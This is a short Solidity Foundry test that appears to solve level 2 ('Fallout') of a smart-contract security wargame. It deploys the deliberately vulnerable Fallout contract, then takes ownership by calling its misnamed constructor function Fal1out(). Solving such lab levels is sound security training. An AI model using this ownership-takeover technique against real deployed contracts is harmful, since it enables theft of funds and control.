// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/02_fallout.sol";

contract AttackerFalloutTest is Test {
    function testLevel02() external {
        vm.prank(address(0x1));
        Fallout fallout = new Fallout();

        console.log("Current Owner is: ", fallout.owner());

        assertFalse(fallout.owner() == address(this));
        fallout.Fal1out();
        assertTrue(fallout.owner() == address(this));

        console.log("New Owner is: ", fallout.owner());
    }
}
